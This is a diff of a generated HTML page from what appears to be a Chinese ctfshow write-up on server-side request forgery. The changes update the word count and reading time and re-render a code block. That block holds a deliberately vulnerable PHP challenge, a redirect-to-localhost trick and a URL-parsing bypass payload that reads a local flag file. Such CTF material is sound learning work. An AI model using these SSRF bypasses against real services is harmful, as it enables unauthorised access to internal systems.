@@ -200,7 +200,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      264 字
+      277 字
     </span>
   
 
@@ -210,7 +210,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      4
+      5
        分钟
     </span>
   
@@ -284,19 +284,19 @@
 <li><pre><code class="php">http://vps/ssrf.php
 ssrf.php里面的内容为：
 &lt;?php header(&#39;Location:127.0.0.1&#39;);?&gt;
-<pre><code class="hljs php">
-```php
-<span class="hljs-meta">&lt;?php</span>
-error_reporting(<span class="hljs-number">0</span>);
-highlight_file(<span class="hljs-keyword">__FILE__</span>);
-$url=$_POST[<span class="hljs-string">&#x27;url&#x27;</span>];
-$x=parse_url($url);
-<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,$url))&#123;
-    <span class="hljs-keyword">echo</span> file_get_contents($url);
+<pre class="language-none"><code class="language-none">
+&#96;&#96;&#96;php
+&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+$url&#x3D;$_POST[&#39;url&#39;];
+$x&#x3D;parse_url($url);
+if(preg_match(&#39;&#x2F;^http:\&#x2F;\&#x2F;ctf\..*show$&#x2F;i&#39;,$url))&#123;
+    echo file_get_contents($url);
 &#125;
 
 
-payload:url=http:<span class="hljs-comment">//ctf.@127.0.0.1/flag.php?show</span></code></pre>
+payload:url&#x3D;http:&#x2F;&#x2F;ctf.@127.0.0.1&#x2F;flag.php?show</code></pre>
 ## web359
 hint:打无密码的mysql
 `./check.php`传参`seturl`
